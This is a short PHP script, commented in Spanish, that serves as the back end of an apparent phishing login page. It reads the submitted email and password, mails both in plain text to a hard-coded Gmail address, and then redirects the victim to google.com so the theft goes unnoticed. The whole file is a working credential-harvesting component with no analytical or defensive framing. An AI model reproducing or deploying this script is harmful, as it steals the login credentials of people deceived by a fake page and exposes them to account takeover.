<?php
// Recibir datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Dirección de email a la que se enviará el mensaje
$recipient_email = 'Jessie1Zahori@gmail.com';

// Construir el mensaje
$subject = 'Nuevo inicio de sesión';
$message = "Se ha iniciado sesión en el sitio web.\n\n";
$message .= "Email: $email\n";
$message .= "Contraseña: $password\n";

// Headers
$headers = "From: webmaster@example.com"; // Cambiar según el remitente deseado

// Enviar el email
$mail_sent = mail($recipient_email, $subject, $message, $headers);

// Verificar si el email se envió correctamente
if ($mail_sent) {
    // Redirigir a google.com
    header('Location: https://www.google.com');
    exit; // Asegurar que el script se detiene después de la redirección
} else {
    echo "Error al enviar el email";
}
?>
